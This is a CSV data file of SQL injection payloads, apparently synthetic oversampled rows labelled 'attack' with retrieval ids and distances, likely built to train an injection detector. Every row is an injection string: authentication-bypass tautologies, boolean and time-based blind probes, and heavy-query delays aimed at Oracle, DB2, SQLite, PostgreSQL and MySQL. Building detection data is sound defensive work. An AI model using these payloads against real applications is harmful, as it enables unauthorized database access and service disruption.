id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000914,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000100,0.02471130294571856
SMOTE_000915,attack,boolean,-2717'   )    )     )   or 8571  =  8571--,nearest_attack_euclidean,R000073,1.4040338132815353
SMOTE_000916,attack,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000034,0.566205323909303
SMOTE_000917,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000111,0.8698657691869756
SMOTE_000918,attack,boolean,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",nearest_attack_euclidean,R000013,0.3808117567686127
SMOTE_000919,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000075,0.016745201833056077
SMOTE_000920,attack,boolean,"1'||  (  select 'hwyv' from dual where 1155  =  1155 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R000120,0.20972551612527626
SMOTE_000921,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000151,0.5880087540787059
SMOTE_000922,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000147,0.8960755326045879
SMOTE_000923,attack,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000034,1.5884850221968656
SMOTE_000924,attack,boolean,"1'+  (  select 'tzyz' where 4912  =  4912 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000146,0.4099646762053424
SMOTE_000925,attack,boolean,1' in boolean mode  )   and 5725  =  5552#,nearest_attack_euclidean,R000081,0.08388575211373946
SMOTE_000926,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000025,1.5554093544241108
SMOTE_000927,attack,boolean,"1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000065,0.35717395010145775
SMOTE_000928,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R000126,1.0405629984928313
SMOTE_000929,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000040,0.3321383770377224
SMOTE_000930,attack,boolean,admin'  )   or '1'  =  '1,nearest_attack_euclidean,R000006,2.7270726279946507
SMOTE_000931,attack,boolean,"-1617%"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000022,2.7463942707530093
SMOTE_000932,attack,boolean,1   )    )     )   and 9575  =  1640--,nearest_attack_euclidean,R000078,0.8384167819710713
SMOTE_000933,attack,boolean,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000117,0.4536294045512235
SMOTE_000934,attack,boolean,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,nearest_attack_euclidean,R000090,2.510867944644992
SMOTE_000935,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000087,0.4839202902110413
SMOTE_000936,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000114,0.4280974971537519
SMOTE_000937,attack,boolean,"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'eqyr' like 'eqyr",nearest_attack_euclidean,R000132,1.5040107009823966
SMOTE_000938,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000040,0.8161623593159545
SMOTE_000939,attack,boolean,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000117,4.6846963008676
SMOTE_000940,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000102,0.659089662924432
SMOTE_000941,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'ukxj'  =  'ukxj",nearest_attack_euclidean,R000137,0.204344942745384
SMOTE_000942,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000075,0.053795679010343975
SMOTE_000943,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000076,1.1496929694425233
SMOTE_000944,attack,boolean," select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000004,4.572699587489719
SMOTE_000945,attack,boolean,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000059,0.94690913719693
SMOTE_000946,attack,boolean,1' in boolean mode  )   and 5725  =  5552#,nearest_attack_euclidean,R000081,0.13273411033645194
SMOTE_000947,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000053,0.1923861262811944
SMOTE_000948,attack,boolean,"admin""  )   or   (  ""1""  =  ""1""--",nearest_attack_euclidean,R000003,1.6960270786066651
SMOTE_000949,attack,boolean,"-5840'  )   or elt  (  1032  =  1032,3623  )  ",nearest_attack_euclidean,R000139,2.5048507612116238
SMOTE_000950,attack,boolean,"1  )   where 2679  =  2679 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000128,0.4419217998378824
SMOTE_000951,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""kxws"" like ""kxws",nearest_attack_euclidean,R000129,1.7076272431396247
SMOTE_000952,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000124,1.3517449599099467
SMOTE_000953,attack,boolean,-7770' where 6503  =  6503 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R000069,0.7282520412653828
SMOTE_000954,attack,boolean,"1'  )   as nvqk where 3917  =  3917 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000063,0.38706556924006696
SMOTE_000955,attack,boolean,"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",nearest_attack_euclidean,R000031,0.9219956635292833
SMOTE_000956,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000107,0.2223427011798352
SMOTE_000957,attack,boolean,-4873'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000106,1.4464001450812982
SMOTE_000958,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000085,0.8509212762277941
SMOTE_000959,attack,boolean,1'+  (  select bgbq where 1589  =  1589 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +',nearest_attack_euclidean,R000115,0.6010371861873228
SMOTE_000960,attack,boolean,"1' where 1230  =  1230 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000105,0.009191138332120744
SMOTE_000961,attack,boolean,"admin""  )   or   (  ""1""  =  ""1""--",nearest_attack_euclidean,R000003,0.3792693235539411
SMOTE_000962,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000116,2.1418234692325524
SMOTE_000963,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000053,1.5295850491655065
SMOTE_000964,attack,boolean,"1%"" or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000010,0.897799144599261
SMOTE_000965,attack,boolean,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000059,1.0495535326614793
SMOTE_000966,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000107,1.3863490086318933
SMOTE_000967,attack,boolean,"1' and make_set  (  3445  =  5963,5963  )   and 'wjfw'  =  'wjfw",nearest_attack_euclidean,R000021,0.25062034571991665
SMOTE_000968,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000124,1.6745094640216938
SMOTE_000969,attack,boolean,"1%""   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000088,1.4035873087649287
SMOTE_000970,attack,boolean,-1989%'   )    )    or 6179  =  8518#,nearest_attack_euclidean,R000135,1.3284397562962467
SMOTE_000971,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000050,1.8976041987904204
SMOTE_000972,attack,boolean,"1' where 6417  =  6417 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000079,0.12367559804597805
SMOTE_000973,attack,boolean,"1%'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000145,1.1380521481982524
SMOTE_000974,attack,boolean,"1   )    )    as xsyk where 2575  =  2575 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000051,1.1729620890003651
SMOTE_000975,attack,boolean,"1%"" or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000010,1.2962605771485982
SMOTE_000976,attack,boolean,"1%""   )    )     )   and 3116  =  9088#",nearest_attack_euclidean,R000041,1.3573860868484073
SMOTE_000977,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'ukxj'  =  'ukxj",nearest_attack_euclidean,R000137,1.8994303854242707
SMOTE_000978,attack,boolean,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000015,0.6471737634507204
SMOTE_000979,attack,boolean,"admin""  )   or   (  ""1""  =  ""1""--",nearest_attack_euclidean,R000003,0.2292571475323945
SMOTE_000980,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000140,0.6647625254026664
SMOTE_000981,attack,boolean,"1'  )   as tuhc where 4018  =  4018 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000122,0.05735266061733598
SMOTE_000982,attack,boolean,"1%""   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R000066,0.17806904449179617
SMOTE_000983,attack,boolean,"1"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000026,0.39079186089676293
SMOTE_000984,attack,boolean,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",nearest_attack_euclidean,R000013,1.7991318453664242
SMOTE_000985,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000050,1.1264927181359836
SMOTE_000986,attack,boolean,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000059,0.9798757218162634
SMOTE_000987,attack,boolean,"1%' or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000045,0.6723465765026414
SMOTE_000988,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000130,1.6896056926805003
SMOTE_000989,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000040,0.1942877595399142
SMOTE_000990,attack,boolean,"1%'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000134,2.4243086084630776
SMOTE_000991,attack,boolean,"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'hqqj'  =  'hqqj",nearest_attack_euclidean,R000119,5.00540062430273
SMOTE_000992,attack,boolean,"1%'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R000150,0.043303048248747825
SMOTE_000993,attack,boolean,-7874   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  2817  =  2817,nearest_attack_euclidean,R000089,2.3664827374429325
SMOTE_000994,attack,boolean,"1   )    )    as prnp where 4932  =  4932 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000068,0.1581890664808723
SMOTE_000995,attack,boolean,"admin""  )   or   (  ""1""  =  ""1""--",nearest_attack_euclidean,R000003,2.279039725514881
SMOTE_000996,attack,boolean,"1%""   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000088,0.08059052997485876
SMOTE_000997,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000048,1.196115334795426
SMOTE_000998,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000038,0.27900410392946967
SMOTE_000999,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000056,1.4165764571308863
SMOTE_001000,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000140,0.6387504489242627
SMOTE_001001,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000062,0.6559875271451304
SMOTE_001002,attack,boolean,"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",nearest_attack_euclidean,R000052,1.4029574202176194
SMOTE_001003,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000154,1.0882913768379023
SMOTE_001004,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000125,1.2557487432633239
SMOTE_001005,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000140,2.8640758805874373
SMOTE_001006,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000002,0.27223079720391646
SMOTE_001007,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'ukxj'  =  'ukxj",nearest_attack_euclidean,R000137,1.846274141492468
SMOTE_001008,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000085,1.6941269680696633
SMOTE_001009,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240",nearest_attack_euclidean,R000011,2.5475966478510785
SMOTE_001010,attack,boolean,"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",nearest_attack_euclidean,R000031,0.9160533977855384
SMOTE_001011,attack,boolean,-2504'   )    )     )   or 8723  =  9715,nearest_attack_euclidean,R000097,0.23811473757278726
SMOTE_001012,attack,boolean,-1989%'   )    )    or 6179  =  8518#,nearest_attack_euclidean,R000135,1.9195924732528598
SMOTE_001013,attack,boolean,-2504'   )    )     )   or 8723  =  9715,nearest_attack_euclidean,R000097,0.28672587043098013
SMOTE_001014,attack,boolean,"1"" and 1668  =  8288",nearest_attack_euclidean,R000029,2.631714196122538
SMOTE_001015,attack,boolean,"1%' or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000045,1.2510605535217771
SMOTE_001016,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000130,0.5772824110113169
SMOTE_001017,attack,boolean,"1'||  (  select 'osty' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000091,2.060713465900809
SMOTE_001018,attack,boolean,1'   )    )    as pdrg where 5960  =  5960 and 9198  =  9198--,nearest_attack_euclidean,R000121,0.9345425917516588
SMOTE_001019,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000104,1.1918754198836607
SMOTE_001020,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000028,1.6213174966493173
SMOTE_001021,attack,boolean,"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'eqyr' like 'eqyr",nearest_attack_euclidean,R000132,1.3287298549802502
SMOTE_001022,attack,boolean,-3339' or 8571  =  8571--,nearest_attack_euclidean,R000082,0.23614682482196914
SMOTE_001023,attack,boolean,"1'  )   as nvqk where 3917  =  3917 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000063,0.8589727074508867
SMOTE_001024,attack,boolean,"1'  )   as tuhc where 4018  =  4018 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000122,0.0833336868439702
SMOTE_001025,attack,boolean,"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",nearest_attack_euclidean,R000080,1.64722235899198
SMOTE_001026,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000113,0.6793507475386777
SMOTE_001027,attack,boolean,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000059,1.2568237552157144
SMOTE_001028,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000100,0.5447589146317496
SMOTE_001029,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000028,0.010931840043498666
SMOTE_001030,attack,boolean,"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000144,1.2777447343838435
SMOTE_001031,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""kxws"" like ""kxws",nearest_attack_euclidean,R000129,0.5720318646380816
SMOTE_001032,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000030,0.3176185517661622
SMOTE_001033,attack,boolean,"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",nearest_attack_euclidean,R000031,0.11853757440205949
SMOTE_001034,attack,boolean,"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",nearest_attack_euclidean,R000042,1.510349975705744
SMOTE_001035,attack,boolean,"1 and elt  (  4249  =  4249,7259  )  -- meef",nearest_attack_euclidean,R000110,0.10746948941701825
